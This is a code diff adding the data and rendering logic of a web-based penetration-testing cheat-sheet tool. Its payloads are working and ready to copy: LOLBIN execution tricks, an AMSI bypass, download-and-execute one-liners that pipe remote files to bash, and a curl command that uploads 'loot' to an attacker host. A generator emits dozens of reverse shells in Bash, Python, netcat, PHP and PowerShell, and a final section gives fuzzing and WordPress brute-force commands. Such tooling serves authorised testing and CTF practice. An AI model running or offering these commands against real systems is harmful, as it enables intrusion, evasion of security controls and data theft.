+      {l:"LOLBIN",t:"regsvr32 /s /n /u /i:http://{{ip}}:{{port}}/{{file}}.sct scrobj.dll"},
+    ],note:"Classic COM scriptlet bypass."},
+    {name:"rundll32 (JS)",tags:["cmd","exec"],cmds:[
+      {l:"JS exec",t:'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("cmd /c powershell -ep bypass");'},
+    ],note:"Abuses built-in DLL."},
+    {name:"InstallUtil (LOLBIN)",tags:["cmd","exec"],cmds:[
+      {l:"Execute",t:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\\{{file}}"},
+    ],note:"Runs arbitrary .NET assembly. Bypasses AppLocker default."},
+  ]},
+  {section:"SMB / File Share",items:[
+    {name:"net use (SMB)",tags:["cmd","anon"],cmds:[
+      {l:"Mount anon",t:"net use \\\\{{ip}}\\{{share}}"},
+      {l:"Mount auth",t:"net use \\\\{{ip}}\\{{share}} /user:{{user}} {{pass}}"},
+      {l:"Copy file",t:"copy \\\\{{ip}}\\{{share}}\\{{file}} %TEMP%\\{{file}}"},
+      {l:"Unmount",t:"net use \\\\{{ip}}\\{{share}} /delete"},
+    ],note:"Kali: impacket-smbserver {{share}} $(pwd) -smb2support"},
+  ]},
+  {section:"FTP",items:[
+    {name:"FTP (CMD built-in)",tags:["cmd","noenc"],cmds:[
+      {l:"One-liner",t:"(echo open {{ip}} {{port}} & echo user {{user}} {{pass}} & echo binary & echo get {{file}} & echo bye) | ftp -n"},
+    ],note:"Kali: python3 -m pyftpdlib -p {{port}} -u {{user}} -P {{pass}} --write"},
+  ]},
+  {section:"Encoded / Bypass",items:[
+    {name:"Base64 IEX",tags:["ps","enc"],cmds:[
+      {l:"Encode (Kali)",t:"echo -n \"IEX (New-Object Net.WebClient).DownloadString('http://{{ip}}:{{port}}/{{file}}')\" | iconv -t UTF-16LE | base64 -w0"},
+      {l:"Run (Win)",t:"powershell -EncodedCommand \x3cBASE64_HERE>"},
+    ],note:"Pair with -NonInteractive -WindowStyle Hidden."},
+    {name:"AMSI bypass (in-memory)",tags:["ps","enc"],cmds:[
+      {l:"Patch",t:"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"},
+    ],note:"May be patched in newer PS. Combine with encoded delivery."},
+  ]},
+  {section:"Linux Download Methods",items:[
+    {name:"curl",tags:["cmd","dl"],cmds:[
+      {l:"Download+exec",t:"curl -so /tmp/{{file}} http://{{ip}}:{{port}}/{{file}} && chmod +x /tmp/{{file}} && /tmp/{{file}}"},
+      {l:"In-memory exec",t:"curl -s http://{{ip}}:{{port}}/{{file}} | bash"},
+      {l:"Upload loot",t:"curl -F 'file=@/tmp/loot.txt' http://{{ip}}:{{port}}/upload"},
+    ],note:"Most reliable on modern Linux. -k to skip TLS verify."},
+    {name:"wget",tags:["cmd","dl"],cmds:[
+      {l:"Download+exec",t:"wget -q http://{{ip}}:{{port}}/{{file}} -O /tmp/{{file}} && chmod +x /tmp/{{file}} && /tmp/{{file}}"},
+      {l:"In-memory exec",t:"wget -qO- http://{{ip}}:{{port}}/{{file}} | bash"},
+    ],note:"Fallback when curl not available."},
+    {name:"Python",tags:["cmd","dl"],cmds:[
+      {l:"Python3",t:"python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{{ip}}:{{port}}/{{file}}','/tmp/{{file}}')\""},
+      {l:"Python2",t:"python -c \"import urllib; urllib.urlretrieve('http://{{ip}}:{{port}}/{{file}}','/tmp/{{file}}')\""},
+    ],note:"Check availability: which python3 python"},
+    {name:"Bash /dev/tcp",tags:["cmd","dl"],cmds:[
+      {l:"Download",t:"exec 3\x3c>/dev/tcp/{{ip}}/{{port}}; printf 'GET /{{file}} HTTP/1.0\\r\\nHost: {{ip}}\\r\\n\\r\\n' >&3; tail -n+8 \x3c&3 > /tmp/{{file}}"},
+    ],note:"Pure bash -- no tools needed. Works when curl/wget blocked."},
+  ]},
+  {section:"Kali Servers (host side)",items:[
+    {name:"HTTP Servers",tags:["cmd","dl"],cmds:[
+      {l:"Python3",t:"python3 -m http.server {{port}}"},
+      {l:"PHP",t:"php -S 0.0.0.0:{{port}}"},
+      {l:"Updog",t:"updog -p {{port}}"},
+    ],note:"Run in the directory containing your payloads."},
+    {name:"SMB Server",tags:["cmd","auth"],cmds:[
+      {l:"Impacket",t:"impacket-smbserver {{share}} $(pwd) -smb2support"},
+      {l:"With auth",t:"impacket-smbserver {{share}} $(pwd) -smb2support -username {{user}} -password {{pass}}"},
+    ],note:"Required for Windows SMB file delivery."},
+  ]},
+  {section:"WinRM / WMI / PsExec",items:[
+    {name:"WinRM (Enter-PSSession)",tags:["ps","auth"],cmds:[
+      {l:"Session",t:"Enter-PSSession -ComputerName {{ip}} -Credential {{user}}"},
+      {l:"Invoke",t:"Invoke-Command -ComputerName {{ip}} -ScriptBlock { whoami } -Credential {{user}}"},
+    ],note:"Port 5985 (HTTP) / 5986 (HTTPS)."},
+    {name:"PsExec (Sysinternals)",tags:["cmd","auth"],cmds:[
+      {l:"Remote exec",t:"PsExec.exe \\\\{{ip}} -u {{user}} -p {{pass}} cmd.exe"},
+    ],note:"Requires admin share access."},
+  ]},
+];
+
+const TAGMETA={ps:{c:'t-ps',l:'PS'},cmd:{c:'t-cmd',l:'CMD'},anon:{c:'t-anon',l:'Anon'},auth:{c:'t-auth',l:'Auth'},enc:{c:'t-enc',l:'Enc'},noenc:{c:'t-noenc',l:'NoEnc'},exec:{c:'t-exec',l:'Exec'},dl:{c:'t-dl',l:'DL'},php:{c:'t-php',l:'PHP'},asp:{c:'t-asp',l:'ASP'},jsp:{c:'t-jsp',l:'JSP'},bypass:{c:'t-bypass',l:'Bypass'},waf:{c:'t-waf',l:'WAF'},sqli:{c:'t-sqli',l:'SQLi'},xss:{c:'t-xss',l:'XSS'},lfi:{c:'t-lfi',l:'LFI'},rce:{c:'t-rce',l:'RCE'},ssti:{c:'t-ssti',l:'SSTI'},ssrf:{c:'t-ssrf',l:'SSRF'}};
+
+function renderMethods(){
+  const vars=gv();
+  const root=document.getElementById('methods-root');
+  root.innerHTML='';
+  METHODS.forEach((sec,si)=>{
+    const sdiv=document.createElement('div');
+    sdiv.innerHTML=`<div class="sec-lbl">${esc(sec.section)}</div>`;
+    sec.items.forEach((item,ii)=>{
+      const id=`mc${si}_${ii}`;
+      const card=document.createElement('div');
+      card.className='mcard';
+      const tagsH=item.tags.map(t=>`<span class="tag ${TAGMETA[t]?TAGMETA[t].c:'t-cmd'}">${TAGMETA[t]?TAGMETA[t].l:t}</span>`).join('');
+      const cmdsH=item.cmds.map((c,ci)=>{
+        const fid=`${id}c${ci}`;
+        return `<div class="crow"><span class="clabel">${esc(c.l)}</span><div class="cbox" id="${fid}">${esc(fill(c.t,vars))}</div><button class="cpbtn" onclick="cp('${fid}',this)">Copy</button></div>`;
+      }).join('');
+      card.innerHTML=`
+        <div class="mhdr" onclick="toggleM('${id}')">
+          <span class="mname">${esc(item.name)}</span>
+          <div class="tags">${tagsH}</div>
+          <span class="tico" id="ico_${id}">+</span>
+        </div>
+        <div class="mbody" id="${id}">
+          ${cmdsH}
+          ${item.note?`<div class="cnote">${esc(fill(item.note,vars))}</div>`:''}
+        </div>`;
+      sdiv.appendChild(card);
+    });
+    root.appendChild(sdiv);
+  });
+}
+
+function toggleM(id){
+  const b=document.getElementById(id);
+  const ico=document.getElementById('ico_'+id);
+  const open=b.classList.toggle('open');
+  ico.textContent=open?'-':'+';
+}
+
+// ══════════════════════════════════
+// REV SHELL GENERATOR
+// ══════════════════════════════════
+let currentOS='lin';
+
+function setOS(os){
+  currentOS=os;
+  document.querySelectorAll('.osbtn').forEach(b=>{b.classList.remove('alin','awin','aboth')});
+  const cls={lin:'alin',win:'awin',both:'aboth'}[os];
+  document.getElementById('osb-'+os).classList.add(cls);
+  genShells();
+}
+
+function shellDefs(ip,port){
+  return [
+    {name:'Bash TCP',os:'lin',type:'bash',cmd:`bash -i >& /dev/tcp/${ip}/${port} 0>&1`,lst:`nc -lvnp ${port}`},
+    {name:'Bash TCP (safe)',os:'lin',type:'bash',cmd:`0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,lst:`nc -lvnp ${port}`},
+    {name:'Bash UDP',os:'lin',type:'bash',cmd:`bash -i >& /dev/udp/${ip}/${port} 0>&1`,lst:`nc -u -lvnp ${port}`},
+    {name:'sh -i',os:'lin',type:'bash',cmd:`sh -i >& /dev/tcp/${ip}/${port} 0>&1`,lst:`nc -lvnp ${port}`},
+    {name:'Bash (exec)',os:'lin',type:'bash',cmd:`exec 5<>/dev/tcp/${ip}/${port}; cat <&5 | while read line; do $line 2>&5 >&5; done`,lst:`nc -lvnp ${port}`},
+    {name:'Python3',os:'lin',type:'python',cmd:`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`,lst:`nc -lvnp ${port}`},
+    {name:'Python2',os:'lin',type:'python',cmd:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,lst:`nc -lvnp ${port}`},
+    {name:'Python3 (short)',os:'lin',type:'python',cmd:`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`,lst:`nc -lvnp ${port}`},
+    {name:'Netcat (traditional)',os:'lin',type:'nc',cmd:`nc -e /bin/sh ${ip} ${port}`,lst:`nc -lvnp ${port}`},
+    {name:'Netcat (mkfifo)',os:'lin',type:'nc',cmd:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,lst:`nc -lvnp ${port}`},
+    {name:'Netcat (ncat SSL)',os:'lin',type:'nc',cmd:`ncat --ssl ${ip} ${port} -e /bin/bash`,lst:`ncat --ssl -lvnp ${port}`},
+    {name:'Perl',os:'lin',type:'perl',cmd:`perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,lst:`nc -lvnp ${port}`},
+    {name:'Ruby',os:'lin',type:'ruby',cmd:`ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,lst:`nc -lvnp ${port}`},
+    {name:'PHP (exec)',os:'lin',type:'php',cmd:`php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,lst:`nc -lvnp ${port}`},
+    {name:'PHP (proc_open)',os:'lin',type:'php',cmd:`php -r '$s=fsockopen("${ip}",${port});$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'`,lst:`nc -lvnp ${port}`},
+    {name:'PHP (popen)',os:'lin',type:'php',cmd:`php -r '$s=fsockopen("${ip}",${port});while(!feof($s)){$c=fgets($s);$o=popen($c,"r");while(!feof($o))fwrite($s,fread($o,1024));pclose($o);}'`,lst:`nc -lvnp ${port}`},
+    {name:'Node.js',os:'lin',type:'node',cmd:`node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(${port},"${ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});'`,lst:`nc -lvnp ${port}`},
+    {name:'Java (Runtime)',os:'lin',type:'java',cmd:`r=Runtime.getRuntime();p=r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5|while read l;do $l 2>&5>&5;done"});p.waitFor();`,lst:`nc -lvnp ${port}`},
+    {name:'Socat (full TTY)',os:'lin',type:'nc',cmd:`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,lst:`socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`},
+    {name:'Lua',os:'lin',type:'bash',cmd:`lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,lst:`nc -lvnp ${port}`},
+    {name:'Awk',os:'lin',type:'bash',cmd:`awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'`,lst:`nc -lvnp ${port}`},
+    // Windows
+    {name:'PowerShell TCP',os:'win',type:'ps',cmd:`powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$r=([Text.Encoding]::ASCII).GetBytes($o2);$s.Write($r,0,$r.Length);}"`,lst:`rlwrap nc -lvnp ${port}`},
+    {name:'PowerShell (encoded)',os:'win',type:'ps',cmd:`# Step 1 on Kali:\nSHELL='$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);}'\necho -n "$SHELL" | iconv -t UTF-16LE | base64 -w0\n\n# Step 2 on target:\npowershell -EncodedCommand <BASE64_OUTPUT>`,lst:`rlwrap nc -lvnp ${port}`},
+    {name:'PowerShell (ConPtyShell)',os:'win',type:'ps',cmd:`IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${ip} ${port}`,lst:`stty raw -echo; nc -lvnp ${port}`},
+    {name:'Netcat.exe',os:'win',type:'nc',cmd:`nc.exe -e cmd.exe ${ip} ${port}`,lst:`nc -lvnp ${port}`},
+    {name:'Python3 (Windows)',os:'win',type:'python',cmd:`python -c "import socket,subprocess;s=socket.socket();s.connect(('${ip}',${port}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"`,lst:`nc -lvnp ${port}`},
+    {name:'PHP (Windows)',os:'win',type:'php',cmd:`php -r '$s=fsockopen("${ip}",${port});exec("cmd.exe <&3 >&3 2>&3");'`,lst:`nc -lvnp ${port}`},
+    {name:'Perl (Windows)',os:'win',type:'perl',cmd:`perl -e "use Socket;$i='${ip}';$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('cmd.exe');"`,lst:`nc -lvnp ${port}`},
+    {name:'mshta HTA',os:'win',type:'ps',cmd:`mshta http://${ip}:${port}/shell.hta`,lst:`python3 -m http.server ${port}  # + nc on another port`},
+  ];
+}
+
+function genShells(){
+  const ip=document.getElementById('rs_ip').value||document.getElementById('v_ip').value||'LHOST';
+  const port=document.getElementById('rs_port').value||document.getElementById('v_sport').value||'4444';
+  const filter=document.getElementById('rs_filter').value;
+  const out=document.getElementById('shell-output');
+
+  document.getElementById('lst-nc').textContent=`nc -lvnp ${port}`;
+  document.getElementById('lst-rl').textContent=`rlwrap nc -lvnp ${port}`;
+
+  const shells=shellDefs(ip,port).filter(s=>{
+    const osOk=currentOS==='both'||s.os===currentOS;
+    const tyOk=filter==='all'||s.type===filter;
+    return osOk&&tyOk;
+  });
+
+  document.getElementById('shell-count').textContent=`${shells.length} shells`;
+
+  if(!shells.length){
+    out.innerHTML=`<div class="empty-st"><div class="empty-ico">~</div><div>No shells match filter</div></div>`;
+    return;
+  }
+
+  out.innerHTML=shells.map((s,i)=>{
+    const osCls=s.os==='lin'?'ob-lin':'ob-win';
+    const osLbl=s.os==='lin'?'Linux':'Windows';
+    const sid=`sc_${i}_${Date.now()}`;
+    return `<div class="scard">
+      <div class="scard-hdr">
+        <span class="scard-name">${esc(s.name)}</span>
+        <span class="osbadge ${osCls}" style="font-size:9px">${osLbl}</span>
+      </div>
+      <div class="scard-code" id="${sid}">${esc(s.cmd)}</div>
+      <div class="scard-foot">
+        <span class="scard-lst">listener: <code>${esc(s.lst)}</code></span>
+        <button class="cpbtn" onclick="cpText(document.getElementById('${sid}').textContent,this)">Copy</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ══════════════════════════════════
+// ATTACK PAGES DATA
+// ══════════════════════════════════
+
+const ATTACKS = {
+
+// ─── WEB RECON ───
+recon:[
+  {section:"Subdomain Fuzzing (FUZZ.target.com)",items:[
+    {name:"ffuf Subdomain Fuzz",tags:["cmd"],cmds:[
+      {l:"Basic",t:"ffuf -u http://FUZZ.{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403"},
+      {l:"Filter by size",t:"ffuf -u http://FUZZ.{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0"},
+      {l:"Filter default",t:"# 1. Run once to see default response size:\nffuf -u http://FUZZ.{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n# 2. Filter that size:\nffuf -u http://FUZZ.{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs SIZE_HERE"},
+      {l:"HTTPS",t:"ffuf -u https://FUZZ.{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"},
+      {l:"With Host hdr",t:"ffuf -u http://{{target}} -H 'Host: FUZZ.{{target}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE_OF_DEFAULT"},
+    ],note:"Host header method works even when DNS doesn't resolve. Always run once first to get default size, then -fs to filter it."},
+    {name:"Gobuster DNS Subdomain",tags:["cmd"],cmds:[
+      {l:"DNS brute",t:"gobuster dns -d {{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50"},
+      {l:"Show IPs",t:"gobuster dns -d {{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --show-cname -i"},
+    ],note:"DNS mode resolves names. Slower but confirms real subdomains."},
+    {name:"wfuzz Subdomain",tags:["cmd"],cmds:[
+      {l:"Basic",t:"wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{{target}} -H 'Host: FUZZ.{{target}}' --hc 404"},
+      {l:"Hide by size",t:"wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{{target}} -H 'Host: FUZZ.{{target}}' --hh CHARS_HERE"},
+      {l:"Hide by words",t:"wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{{target}} -H 'Host: FUZZ.{{target}}' --hw WORDS_HERE"},
+    ],note:"wfuzz: --hc hide code, --hh hide chars, --hw hide words, --hl hide lines. Run once to see defaults."},
+    {name:"Subfinder + httpx Passive",tags:["cmd"],cmds:[
+      {l:"Passive enum",t:"subfinder -d {{target}} -all -silent | sort -u | tee subs.txt"},
+      {l:"Probe live",t:"cat subs.txt | httpx -silent -status-code -title -tech-detect -follow-redirects | tee live-subs.txt"},
+      {l:"Pipeline",t:"subfinder -d {{target}} -all -silent | httpx -silent -status-code -title | tee live-subs.txt"},
+    ],note:"Passive first (no noise), then probe which are alive. Best recon starting point."},
+    {name:"Amass Subdomain Enum",tags:["cmd"],cmds:[
+      {l:"Passive",t:"amass enum -passive -d {{target}} -o amass-passive.txt"},
+      {l:"Active brute",t:"amass enum -active -d {{target}} -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o amass-active.txt"},
+    ],note:"Amass uses 50+ data sources. -active adds DNS resolution and zone transfers."},
+  ]},
+  {section:"Directory & Path Fuzzing (target.com/FUZZ)",items:[
+    {name:"ffuf Dir/File Fuzz",tags:["cmd"],cmds:[
+      {l:"Basic dirs",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403"},
+      {l:"Large wordlist",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302,403"},
+      {l:"With extensions",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.html,.txt,.bak,.zip,.old,.conf,.xml,.json,.sql,.log -mc 200,301,302"},
+      {l:"Recursive",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -recursion -recursion-depth 3"},
+      {l:"Filter by size",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0 -mc all"},
+      {l:"With cookie",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -b 'PHPSESSID=abc123; token=xyz' -mc 200,301,302"},
+      {l:"With auth hdr",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -H 'Authorization: Bearer TOKEN_HERE' -mc 200,301,302"},
+      {l:"Rate limited",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -rate 50 -mc 200,301,302"},
+      {l:"Output JSON",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -o results.json -of json"},
+    ],note:"ffuf is fastest. Key flags: -mc match codes, -fc filter codes, -fs filter size, -fw filter words, -fl filter lines, -e extensions, -recursion."},
+    {name:"Gobuster Dir",tags:["cmd"],cmds:[
+      {l:"Standard",t:"gobuster dir -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak,zip -t 40"},
+      {l:"Large + exts",t:"gobuster dir -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,jsp,html,js,txt,bak,old,zip -t 50"},
+      {l:"With cookie",t:"gobuster dir -u http://{{target}} -w /usr/share/wordlists/dirb/common.txt -c 'PHPSESSID=abc123' -x php,html,txt"},
+      {l:"Status codes",t:"gobuster dir -u http://{{target}} -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,401,403' -x php,html"},
+      {l:"No TLS verify",t:"gobuster dir -u https://{{target}} -w /usr/share/wordlists/dirb/common.txt -k -x php,html,txt"},
+    ],note:"gobuster: -x extensions, -s status codes, -b exclude codes, -c cookie, -k skip TLS, -a user-agent."},
+    {name:"Feroxbuster Recursive",tags:["cmd"],cmds:[
+      {l:"Standard",t:"feroxbuster -u http://{{target}} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -d 3 -x php,html,txt"},
+      {l:"With extensions",t:"feroxbuster -u http://{{target}} -x php,asp,aspx,jsp,html,js,txt,bak,old,zip,sql,conf,json -d 4 --auto-tune"},
+      {l:"Authenticated",t:"feroxbuster -u http://{{target}} -b 'PHPSESSID=abc123' -x php,html -d 3"},
+      {l:"Smart filter",t:"feroxbuster -u http://{{target}} --auto-tune --smart --collect-words -x php,html,txt"},
+      {l:"Status filter",t:"feroxbuster -u http://{{target}} -C 404,403 -x php,html,txt -d 3"},
+    ],note:"Auto-recursive by default. --auto-tune adjusts speed. --smart builds custom wordlist from responses."},
+    {name:"Dirsearch",tags:["cmd"],cmds:[
+      {l:"Standard",t:"dirsearch -u http://{{target}} -e php,html,js,txt -x 404,403"},
+      {l:"Recursive",t:"dirsearch -u http://{{target}} -e php,html,js,txt -x 404 -r -R 3"},
+      {l:"Full scan",t:"dirsearch -u http://{{target}} -e php,asp,aspx,jsp,html,js,txt,bak,zip,old,sql,xml,json,conf,log -x 404 -t 50"},
+    ],note:"Has built-in smart wordlist. -r recursive, -R depth, --random-agent for WAF bypass."},
+    {name:"wfuzz Dir Fuzz",tags:["cmd"],cmds:[
+      {l:"Basic",t:"wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://{{target}}/FUZZ"},
+      {l:"With extension",t:"wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://{{target}}/FUZZ.php"},
+      {l:"Multi wordlist",t:"wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w extensions.txt --hc 404 http://{{target}}/FUZZFUZ2Z"},
+      {l:"Authenticated",t:"wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 -b 'PHPSESSID=abc123' http://{{target}}/FUZZ"},
+    ],note:"wfuzz: FUZZ for first wordlist, FUZ2Z for second. Combine dir + extension wordlists."},
+  ]},
+  {section:"Tech-Specific Extension Lists",items:[
+    {name:"PHP Application",tags:["cmd"],cmds:[
+      {l:"ffuf PHP",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.php3,.php4,.php5,.phtml,.phps,.pht,.phar,.inc,.bak,.old,.conf,.sql,.zip,.tar.gz,.log -mc 200,301,302,403"},
+      {l:"PHP configs",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.ini,.env,.bak,.old,.swp,.config -mc 200,301,302,403"},
+    ],note:"PHP: check .env, .php.bak, .php.old, .php~, .php.swp (vim swap), .htaccess, .htpasswd."},
+    {name:"ASP.NET / IIS Application",tags:["cmd"],cmds:[
+      {l:"ffuf ASP",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .asp,.aspx,.ashx,.asmx,.config,.svc,.axd,.cs,.cshtml,.asax,.ascx -mc 200,301,302,403"},
+      {l:"IIS specific",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -mc 200,301,302,403"},
+      {l:"IIS shortname",t:"# IIS ~1 shortname scanner:\npython3 iis_shortname_scanner.py http://{{target}}/"},
+    ],note:"IIS: check web.config, web.config.bak, trace.axd, elmah.axd, /aspnet_client/."},
+    {name:"Java / Tomcat Application",tags:["cmd"],cmds:[
+      {l:"ffuf Java",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .jsp,.jspx,.jsw,.jsv,.do,.action,.xml,.properties,.yaml,.yml,.json,.war -mc 200,301,302,403"},
+      {l:"Tomcat paths",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -mc 200,301,302,403"},
+    ],note:"Tomcat: /manager/html, /host-manager, /status, WEB-INF/web.xml. Default creds: tomcat:tomcat, admin:admin."},
+    {name:"Node.js Application",tags:["cmd"],cmds:[
+      {l:"ffuf Node",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .js,.json,.env,.map,.ts,.yml,.yaml,.config,.md -mc 200,301,302,403"},
+      {l:"Source maps",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js.map,.css.map -mc 200"},
+    ],note:"Node: check package.json, .env, .map files (source maps leak source code), /graphql, /api-docs."},
+    {name:"WordPress",tags:["cmd"],cmds:[
+      {l:"WPScan",t:"wpscan --url http://{{target}} -e vp,vt,u,cb,dbe --api-token YOUR_TOKEN"},
+      {l:"WP enum users",t:"wpscan --url http://{{target}} -e u1-100"},
+      {l:"WP brute",t:"wpscan --url http://{{target}} -U admin -P /usr/share/wordlists/rockyou.txt"},
+      {l:"WP paths",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -mc 200,301,302,403"},
+    ],note:"Also check: /wp-config.php.bak, /wp-content/debug.log, /xmlrpc.php, /?author=1."},
+  ]},
+  {section:"Backup & Sensitive File Discovery",items:[
+    {name:"Backup File Fuzz",tags:["cmd"],cmds:[
+      {l:"Common backups",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .bak,.old,.orig,.save,.swp,.swo,.tmp,.temp,.copy,.gz,.tar,.tar.gz,.zip,.rar,.7z,.sql,.sql.gz,.db -mc 200"},
+      {l:"Config backups",t:"# Common backup patterns for config files:\nffuf -u http://{{target}}/FUZZ -mc 200 -w - \x3c\x3c 'EOF'\nweb.config.bak\nweb.config.old\n.env\n.env.bak\n.env.local\n.env.production\nconfig.php.bak\nwp-config.php.bak\nconfiguration.php.old\nsettings.py.bak\napplication.yml.bak\n.htpasswd\n.htaccess.bak\nrobots.txt\nsitemap.xml\ncrossdomain.xml\nEOF"},
+      {l:"Vim swap files",t:"# Vim leaves .file.swp swap files:\nffuf -u http://{{target}}/FUZZ -mc 200 -w - \x3c\x3c 'EOF'\n.index.php.swp\n.config.php.swp\n.wp-config.php.swp\n.htaccess.swp\n.env.swp\nEOF"},
+    ],note:"Editors leave backup files: .bak, .old, ~, .swp (vim), .save. Archivers: .zip, .tar.gz, .sql.gz."},
+    {name:"Exposed Sensitive Files",tags:["cmd"],cmds:[
